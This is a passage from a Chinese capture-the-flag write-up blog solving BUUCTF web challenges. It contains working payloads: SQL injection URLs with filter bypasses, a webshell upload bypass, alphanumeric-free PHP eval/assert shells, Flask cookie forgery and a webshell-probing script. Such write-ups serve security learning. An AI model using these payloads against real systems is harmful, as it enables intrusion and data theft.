class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'nonono'</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'yesyes'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> Name(<span class="string">'admin'</span>,<span class="number">100</span>);</span><br><span class="line">$obj = serialize($obj);</span><br><span class="line">$obj = str_replace(<span class="string">':2:'</span>, <span class="string">':3:'</span>, $obj);</span><br><span class="line"><span class="keyword">echo</span> urlencode($obj);</span><br></pre></td></tr></table></div></figure><br>payload:<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D</span><br></pre></td></tr></table></div></figure></p>        <h1 id="极客大挑战-2019-Knife">          <a href="#极客大挑战-2019-Knife" class="heading-link"><i class="fas fa-link"></i></a>[极客大挑战 2019]Knife</h1>      <p>题目直接给出了shell<code>eval($_POST[&quot;Syc&quot;]);</code><br>然后直接读flag就行了<br><img src="/2020/04/02/buuctf/22.png" alt></p>        <h1 id="极客大挑战-2019-LoveSQL">          <a href="#极客大挑战-2019-LoveSQL" class="heading-link"><i class="fas fa-link"></i></a>[极客大挑战 2019]LoveSQL</h1>      <p>题目毫无过滤，直接一把梭就行了，payload如下：<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;4616398c-abd6-4030-87b8-27d8abd6fd4c.node3.buuoj.cn&#x2F;check.php?username&#x3D;adin%27union%20select%201,(select%20group_concat(password)%20from%20l0ve1ysq1),3%23&amp;password&#x3D;addmin</span><br></pre></td></tr></table></div></figure></p>        <h1 id="极客大挑战-2019-Http">          <a href="#极客大挑战-2019-Http" class="heading-link"><i class="fas fa-link"></i></a>[极客大挑战 2019]Http</h1>      <p>修改指定http头即可<br><img src="/2020/04/02/buuctf/23.png" alt></p>        <h1 id="极客大挑战-2019-BabySQL">          <a href="#极客大挑战-2019-BabySQL" class="heading-link"><i class="fas fa-link"></i></a>[极客大挑战 2019]BabySQL</h1>      <p>过滤了or,and,from,union,select,where等字符，可以通过双写绕过，payload<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;39ae0ce7-baa4-43ed-9adf-df019b95a001.node3.buuoj.cn&#x2F;check.php?username&#x3D;0&#39; uniunionon seselectlect 1,(seleselectct group_concat(passwoorrd) frfromom b4bsql),3-- +&amp;password&#x3D;456</span><br></pre></td></tr></table></div></figure></p>        <h1 id="极客大挑战-2019-BuyFlag">          <a href="#极客大挑战-2019-BuyFlag" class="heading-link"><i class="fas fa-link"></i></a>[极客大挑战 2019]BuyFlag</h1>      <p>题目Attention给出提示</p><blockquote><p>If you want to buy the FLAG:<br>You must be a student from CUIT!!!<br>You must be answer the correct password!!!</p></blockquote><p>同时view-source存在源码<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">    ~~~post money <span class="keyword">and</span> password~~~</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span> (is_numeric($password)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"password can't be number&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">elseif</span> ($password == <span class="number">404</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Password Right!&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></div></figure><br>也就是说，得到flag需要达到三个条件</p><ol><li>是CUIT’s student</li><li>正确的密码</li><li>足够的money</li></ol><p>查看返回头可以看到存在cookie<code>user=0</code>，猜测可能是身份鉴别字段，修改值为1，这样就通过了CUIT的验证</p><blockquote><p>you are Cuiter<br>Please input your password!!</p></blockquote><p>password字段的验证绕过很简单，<code>is_numeric</code>存在截断漏洞，提交<code>password=404%00aaa</code>即可绕过</p><blockquote><p>you are Cuiter<br>Password Right!<br>Pay for the flag!!!hacker!!!</p></blockquote><p>然后提交金额100000000</p><blockquote><p>you are Cuiter<br>Password Right!<br>Nember lenth is too long</p></blockquote><p>数字过长可以使用科学计数法，提交<code>money=1e9</code>即可getflag</p>        <h1 id="极客大挑战-2019-Upload">          <a href="#极客大挑战-2019-Upload" class="heading-link"><i class="fas fa-link"></i></a>[极客大挑战 2019]Upload</h1>      <p>很简单的上传绕过，需要修改三个点</p><ol><li>content-type: image/jpeg</li><li>修改文件后缀名为phtml</li><li>添加图片前缀<code>GIF89a</code></li><li>使用标签<code>&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;</code></li></ol><p><img src="/2020/04/02/buuctf/24.png" alt></p><p>上传成功后需要猜测上传目录，实际上传目录为<code>upload</code><br>getflag payload：<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;2625763a-f599-4a0b-a1c7-1f9501ab20d2.node3.buuoj.cn&#x2F;upload&#x2F;shell.phtml?snow&#x3D;system(%27cat%20&#x2F;flag%27);</span><br></pre></td></tr></table></div></figure></p>        <h1 id="极客大挑战-2019-HardSQL">          <a href="#极客大挑战-2019-HardSQL" class="heading-link"><i class="fas fa-link"></i></a>[极客大挑战 2019]HardSQL</h1>      <p>报错注入，过滤了空格，可以使用括号包裹绕过，<code>=&lt;&gt;</code>也被过滤了，可以使用<code>in</code>语句来绕过<br>爆表<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;398e34ad-ff1a-4090-80c3-7917a9249043.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin&#39;^(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)in(select(database()))),0x7e),1))%23&amp;password&#x3D;admin</span><br></pre></td></tr></table></div></figure></p><blockquote><p>H4rDsq1</p></blockquote><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;398e34ad-ff1a-4090-80c3-7917a9249043.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin&#39;^(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)in(select(&#39;H4rDsq1&#39;))),0x7e),1))%23&amp;password&#x3D;admin</span><br></pre></td></tr></table></div></figure><blockquote><p>XPATH syntax error: ‘~id,username,password~‘</p></blockquote><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;398e34ad-ff1a-4090-80c3-7917a9249043.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin&#39;^(updatexml(1,concat(0x7e,(select(left(password,31))from(H4rDsq1)),0x7e),1))%23&amp;password&#x3D;admin</span><br></pre></td></tr></table></div></figure><blockquote><p>XPATH syntax error: ‘~flag{7ba38da2-8bbb-4d78-9c9d-6a’</p></blockquote><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;398e34ad-ff1a-4090-80c3-7917a9249043.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin&#39;^(updatexml(1,concat(0x7e,(select(right(password,31))from(H4rDsq1)),0x7e),1))%23&amp;password&#x3D;admin</span><br></pre></td></tr></table></div></figure><blockquote><p>XPATH syntax error: ‘~a2-8bbb-4d78-9c9d-6abe9bc51c29}’</p></blockquote>        <h1 id="极客大挑战-2019-RCE-ME">          <a href="#极客大挑战-2019-RCE-ME" class="heading-link"><i class="fas fa-link"></i></a>[极客大挑战 2019]RCE ME</h1>      <p>考察命令执行，题目给出了代码<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code=$_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"This is too Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><br>参考P神的一篇博文<span class="exturl"><a class="exturl__link" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">无字母数字shell提高篇</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>中提到一种方法，在PHP7中，可以使用<code>($a)()</code>来执行代码，比如使用<code>(&#39;phpinfo&#39;)()</code>可以执行phpinfo函数<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php7 -r <span class="string">"('phpinfo')();"</span></span><br></pre></td></tr></table></div></figure><br>运行该命令可以看到成功打印PHP信息，不过在版本小于PHP7时是不可以的<br>由于不允许出现数字字母，我们需要设法表示字母，可以使用<code>~</code>来实现，比如<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php7 -r &quot;echo urlencode(~&#39;phpinfo&#39;);&quot;  # 为了避免字符显示问题，所以进行了url编码</span><br></pre></td></tr></table></div></figure><br>然后运行<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">php7 -r &quot;(~urldecode(&#39;%8F%97%8F%96%91%99%90&#39;))();&quot;;</span><br><span class="line"></span><br><span class="line">phpinfo()</span><br><span class="line">PHP Version &#x3D;&gt; 7.0.12</span><br><span class="line"></span><br><span class="line">System &#x3D;&gt; Windows NT DESKTOP-S4PD6MS 10.0 build 17763 (Windows 10) i586</span><br><span class="line">Build Date &#x3D;&gt; Oct 13 2016 10:44:50</span><br><span class="line">Compiler &#x3D;&gt; MSVC14 (Visual C++ 2015)</span><br><span class="line">Architecture &#x3D;&gt; x86</span><br></pre></td></tr></table></div></figure><br>可以看到是可以运行的，提交该payload，可以看到phpinfo()执行结果，查看disable_functions选项<br><img src="/2020/04/02/buuctf/25.png" alt><br>常用命令执行函数被ban了，可以使用<code>var_dump+scandir+file_get_contents</code>组合拳来读取文件<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜ php7 -r &quot;echo urlencode(~&#39;var_dump&#39;);&quot;</span><br><span class="line">%89%9E%8D%A0%9B%8A%92%8F</span><br><span class="line">➜ php7 -r &quot;echo urlencode(~&#39;scandir&#39;);&quot;</span><br><span class="line">%8C%9C%9E%91%9B%96%8D</span><br></pre></td></tr></table></div></figure><br>payload为<code>(~%89%9E%8D%A0%9B%8A%92%8F)((~%8C%9C%9E%91%9B%96%8D)(%27/%27));</code>，相当于执行了<code>var_dump(scandir(&#39;/&#39;));</code><br><img src="/2020/04/02/buuctf/26.png" alt><br>但是，接下来读取文件时却无法读取，应该是没有相应的权限，根目录下还有一个readflag文件，应该是要调用该程序读取flag<br>这样的话需要我们进行绕过disable_functions进行提权，我们先尝试获取一个webshell</p><p>查看disable_functions可以看到<code>assert</code>没有被ban，可以尝试利用之<br>官方文档中说，php7+版本中，assert不再作为函数而是作为一种语言结构，而且默认不能执行代码，不过，使用间接调用的方法却是可以当做函数执行的（不知道为啥），比如：<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(var_dump(<span class="string">'aaa'</span>));</span><br></pre></td></tr></table></div></figure><br>该语句执行时无任何返回，我们使用间接的方式来执行：<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="string">'assert'</span>;</span><br><span class="line">$a(var_dump(<span class="string">'aaa'</span>));</span><br></pre></td></tr></table></div></figure></p><blockquote><p>string(3) “aaa”<br>PHP Warning:  assert(): Assertion failed in /var/www/html/rce.php on line 4</p></blockquote><p>此时成功执行</p><p>那么，我们就用此方法来getshell，payload如下：<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code&#x3D;$&#123;~(%A0%B8%BA%AB)&#125;[_]($&#123;~(%A0%B8%BA%AB)&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[___]);</span><br></pre></td></tr></table></div></figure><br><img src="/2020/04/02/buuctf/27.png" alt><br>然后使用蚁剑连接，蚁剑中正好有绕过disable_funcs的插件，直接用一下<br><img src="/2020/04/02/buuctf/28.png" alt><br>提权之后读flag<br><img src="/2020/04/02/buuctf/28.png" alt></p><p>PS：根据出题大佬的原意，第一步的getshell是希望我们实现无文件getshell，并且给出了payload<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;(~%9E%8C%8C%9A%8D%8B)((~%91%9A%87%8B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()));</span><br><span class="line">&#x2F;&#x2F;(&quot;assert&quot;)((&quot;next&quot;)((&quot;getallheaders&quot;)()));</span><br></pre></td></tr></table></div></figure><br>然后通过UA头即可执行任意命令</p><hr>        <h1 id="PHP语言结构（language-construct）：">          <a href="#PHP语言结构（language-construct）：" class="heading-link"><i class="fas fa-link"></i></a>PHP语言结构（language construct）：</h1>      <p><strong>语言结构与函数相比的一些特征：</strong></p><ol><li>很多不需要括号，有的会需要</li><li>一些语言结构，能够实现一些函数不可能完成的事情，比如isset，经常会访问一下不存在的变量，如果使用函数来实现会非常难;</li><li>一些语言结构与函数写法存在差异。例如，Array(…)结构可以写成[…]</li><li>正如文档不断提醒我们的，<strong>语言结构不能作为可变函数引用</strong>。即<code>$a=&#39;print_r&#39;; $a(…);</code>是可以的，而<code>$a=&#39;print&#39;;$a(…);</code>则不行，因为print_r是函数，而print是语言结构</li></ol>        <h1 id="护网杯-2018-easy-tornado">          <a href="#护网杯-2018-easy-tornado" class="heading-link"><i class="fas fa-link"></i></a>[护网杯 2018]easy_tornado</h1>      <p>python模板注入题目，查看hint.txt可知题目需要知道文件名与签名，flag.txt中已给出了flag位置<code>/fllllllllllllag</code>，签名格式为</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></div></figure><p>所以此题目标就是要获取<code>cookie_secret</code>值，当签名错误后会报错，此报错页面存在模板注入</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;c031cfdc-f167-430e-858a-52ddf7406018.node3.buuoj.cn&#x2F;error?msg&#x3D;Error</span><br></pre></td></tr></table></div></figure><p>简单测试</p><p><img src="/2020/04/02/buuctf/1.png" alt></p><p>通过hander对象来进行注入可以得到cookie</p><p><img src="/2020/04/02/buuctf/2.png" alt></p><p>然后计算签名获得flag</p><p><img src="/2020/04/02/buuctf/3.png" alt></p>        <h1 id="SUCTF-2019-EasySQL">          <a href="#SUCTF-2019-EasySQL" class="heading-link"><i class="fas fa-link"></i></a>[SUCTF 2019]EasySQL</h1>      <p>本题是数字型注入，测试过滤</p><p><img src="/2020/04/02/buuctf/4.png" alt></p><p>发现题目可以进行堆叠注入，本来想利用<code>execute</code>来执行语句，但是过滤了prepare，根据探测发现目标表名为<code>Flag</code></p><p><img src="/2020/04/02/buuctf/5.png" alt></p><p>但是flag被过滤了，<code>from</code>字段也没法用，这里做到这儿就没思路了，查看资料发现解法是设置sql_mode，真的学到了</p><p>本题需要猜测后端的SQL语句，当输入0无数据返回，输入1会返回数据，所以后端可能是存在异或的</p><p><img src="/2020/04/02/buuctf/6.png" alt></p><p>后端sql语句可能是</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"select "</span>.$query.<span class="string">"||flag from Flag"</span>;</span><br></pre></td></tr></table></div></figure><p>所以我们直接输入<code>*,1</code>也可以得到flag</p><p>除此之外，官方解法还可以通过设置sql_mode来解决，将<code>||</code>变为类似Oracle的管道连接符</p><p><img src="/2020/04/02/buuctf/7.png" alt></p><p>payload如下：</p><figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="keyword">set</span> sql_mode=pipes_as_concat;<span class="keyword">select</span> <span class="number">1</span></span><br></pre></td></tr></table></div></figure><p><img src="/2020/04/02/buuctf/8.png" alt></p>        <h1 id="HCTF-2018-admin">          <a href="#HCTF-2018-admin" class="heading-link"><i class="fas fa-link"></i></a>[HCTF 2018]admin</h1>      <p>查看源代码发现提示信息</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- you are not admin --&gt;</span><br></pre></td></tr></table></div></figure><p>需要我们以admin身份登录，浏览之后发现有注册功能，随便注册一个账号，登录之后看到存在cookie，应该是要伪造cookie，查看cookie格式应该是flask下的cookie，那么伪造的话我们需要获得secret_key，尝试了模板注入没有发现，最终在change页面发现源代码地址</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https:&#x2F;&#x2F;github.com&#x2F;woadsl1234&#x2F;hctf_flask&#x2F; --&gt;</span><br></pre></td></tr></table></div></figure><p>查看源代码可以得知secret_key为<code>ckj123</code></p><p>然后就是正常的cookie伪造</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py .\flask_session_cookie_manager3.py decode -c &#39;.eJxNkMGKwjAURX9lyNpFmupGcFGJU1J4L1QyE_I2MqNVm1iFVqmN-O9TXc32wD1w7oNt9m3VHdn82t6qCdvUOzZ_sI9fNmeYlz0ZFUGGQRvHtVwJyt0dPQiwVKOFAeUhYoRE23Xj7GpAQQGN4mi_j-iXwfml11IJZ4sa5WtbnJxQA8QiUL7i2mScbJmO3imZLCVTBJQZd2JdYwMJCDUDW5wo_xy5SsGXXOcYyGCjbdmjD_dxu2DPCdt27X5zvYTq_C9h1PqQogHuouqd30b0B06-nGq5q1-cJAiyX2OKmrkIUzos3rrzT1ONiu586dmE3bqqfZ_DEs6ef_NiYyk.XkThtA.0N3JaixDVMTckrVyXBvrmGo7sgI&#39; -s &#39;ckj123&#39;</span><br></pre></td></tr></table></div></figure><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py .\flask_session_cookie_manager3.py encode -t &quot;&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;4d0e23092964816df16361fb5c24837359dfaa27fd5245ea60db0c826abb46162ecb232dda4904ed7df8e07e2d404cdb6c53b91bedad4272448cde3f9d0691df&#39;, &#39;csrf_token&#39;: b&#39;4f8f97534c20b73684f4887b534d36ee2429c38f&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;1&#39;&#125;&quot; -s &quot;ckj123&quot;</span><br></pre></td></tr></table></div></figure><p>可以得到cookie</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJxNkMGKwjAURX9leGsXMdWN4EKJU1J4L1QyE_I24mjVJtaBqmgj_vtUV7M9cA-c-4DVrq3OB5hc2ms1gFW9hckDPn5gApSXN7Y6oYqdsV4YtZCc-zsFlOi4JocdqX2ihEPjlo13i44kR7JakPs-UJhHH-bBKC29K2pSr21x9FJ3mIrI-UIYOxPsyqz3jtjOMrZFJDUTXi5ranCIUo_RFUfOP3uuMwylMDlFttQYV94oxHu_ncJzAJtzu1tdfmN1-pfQa0PMyKLwSd982CQKe8GhHBm1rV-cFUp2X32KHvuEI95P37rTuql6xXrb1CcYwPVcte93YAjPP_KyYzs.XkTsFA.YOebiET5QoqNJ-EXRqMFRBrKHg8</span><br></pre></td></tr></table></div></figure><p><img src="/2020/04/02/buuctf/9.png" alt></p><hr><p>本题还有其它解法</p><p><strong>方法二：</strong></p><p>pass</p>        <h1 id="强网杯-2019-高明的黑客">          <a href="#强网杯-2019-高明的黑客" class="heading-link"><i class="fas fa-link"></i></a>[强网杯 2019]高明的黑客</h1>      <p>题目直接给出了源码，下载之后是三千多个shell，但是大部分都不能用，需要找出能够使用的，方法是通过匹配<code>$_POST</code>或<code>$_GET</code>来执行命令，这里可以使用<code>echo</code>命令，因为该命令既在PHP下可以执行，在shell条件下也可以执行，此外，如果一个一个试的话速度会非常慢，我们需要使用多线程来增加速度，代码如下</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> multiprocessing <span class="keyword">as</span> mp</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.75.144/'</span></span><br><span class="line">flag = <span class="number">1</span>  <span class="comment"># 在得到可用shell之后退出线程</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_shell</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        command = <span class="string">"echo 'aesm1p';"</span></span><br><span class="line">        <span class="keyword">with</span> open(filename) <span class="keyword">as</span> f:</span><br><span class="line">            cont = f.read()</span><br><span class="line">            <span class="comment"># POST</span></span><br><span class="line">            catches = re.findall(<span class="string">r"\$_POST\['(\S+)'\]"</span>, cont)</span><br><span class="line">            <span class="keyword">for</span> para <span class="keyword">in</span> catches:</span><br><span class="line">                data = &#123;para: command&#125;</span><br><span class="line">                res = requests.post(url+filename, data=data).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'aesm1p'</span> <span class="keyword">in</span> res:</span><br><span class="line">                    flag = <span class="number">0</span></span><br><span class="line">                    print(<span class="string">'Success! url is &#123;&#125;. payload: &#123;&#125;'</span>.format(url + filename, para))</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># GET</span></span><br><span class="line">            catches = re.findall(<span class="string">r"\$_GET\['(\S+)'\]"</span>, cont)</span><br><span class="line">            <span class="keyword">for</span> para <span class="keyword">in</span> catches:</span><br><span class="line">                res = requests.get(url + filename + <span class="string">'?'</span> + para + <span class="string">'='</span> + command).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'aesm1p'</span> <span class="keyword">in</span> res:</span><br><span class="line">                    flag = <span class="number">0</span></span><br><span class="line">                    print(<span class="string">'Success! url is &#123;&#125;'</span>.format(url + filename + <span class="string">'?'</span> + para + <span class="string">'='</span> + command))</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    files = os.listdir(<span class="string">'src/'</span>)</span><br><span class="line">    pool = mp.Pool(processes=<span class="number">30</span>)</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        pool.apply_async(test_shell,args = (<span class="string">'src/'</span> + file,))</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br></pre></td></tr></table></div></figure><p><img src="/2020/04/02/buuctf/10.png" alt></p><p><img src="/2020/04/02/buuctf/11.png" alt></p>        <h1 id="RoarCTF-2019-Easy-Calc">          <a href="#RoarCTF-2019-Easy-Calc" class="heading-link"><i class="fas fa-link"></i></a>[RoarCTF 2019]Easy Calc</h1>      <p>本题考点是php的字符串解析特性</p><p>PHP在将查询字符串（在URL中或者在正文中）转化为<code>$_GET</code>或<code>$_POST</code>数组时，会将一些字符删除或用下划线替代，它在解析时会做两件事</p><blockquote><ol><li>删除某些空白字符</li><li>将某些字符转换为下划线</li></ol></blockquote><p>例如下面这段代码</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump($_GET);</span><br><span class="line">var_dump($_POST);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><p><img src="/2020/04/02/buuctf/12.png" alt></p><p>可以看到，在get参数中<code>[</code>被转换成了<code>_</code>，而字段名<code>前面的空格</code>被置空，但是字段名<code>后面的空格</code>会被保留</p><p>这个特性在绕过某些waf时可以用到，如某些waf对<code>user_id</code>字段有过滤，我们可以使用字段<code>user[id</code>来绕过，waf不会检测该字段，但是到了PHP后端则又会被转化为<code>user_id</code>，从而成功绕过WAF。</p><hr><p>本题中，查看源代码</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--I&#39;ve set up WAF to ensure security.--&gt;</span><br></pre></td></tr></table></div></figure><p>给出了calc.php的代码</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = 